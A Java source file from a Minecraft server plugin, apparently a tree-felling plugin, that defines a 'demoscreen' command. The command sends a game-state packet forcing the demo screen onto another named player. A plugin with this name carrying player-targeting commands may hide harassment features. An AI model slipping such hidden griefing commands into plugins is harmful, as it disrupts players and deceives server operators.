package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.CraftBukkitUtil;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.ArrayList;

public class DemoScreen extends Command {
    public DemoScreen() {
        super("demoscreen", "I hope you bought Minecraft and not pirated it!", CommandCategory.Player, 1);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        try {
            Player anotherPlayer = Bukkit.getPlayer(args.get(0));
            if (anotherPlayer == null) {
                Start.ErrorString(p, "Player \"" + args.get(0) + "\" is not online!");
                return;
            }
            Object packetPlayOutGameStateChange;
            final Class<?> packetPlayOutGameStateChangeClass = ReflectionUtils.getMinecraftClass("PacketPlayOutGameStateChange");
            packetPlayOutGameStateChange = ReflectionUtils.getConstructorCached(packetPlayOutGameStateChangeClass, int.class, float.class).invoke(5, 0);
            CraftBukkitUtil.sendPacket(anotherPlayer, packetPlayOutGameStateChange);
            p.sendMessage(Start.Prefix + ChatColor.BLUE + anotherPlayer.getName() + " now has demo screen!");
        } catch (Exception e) {
            Start.ErrorException(p, e);
        }
    }
}
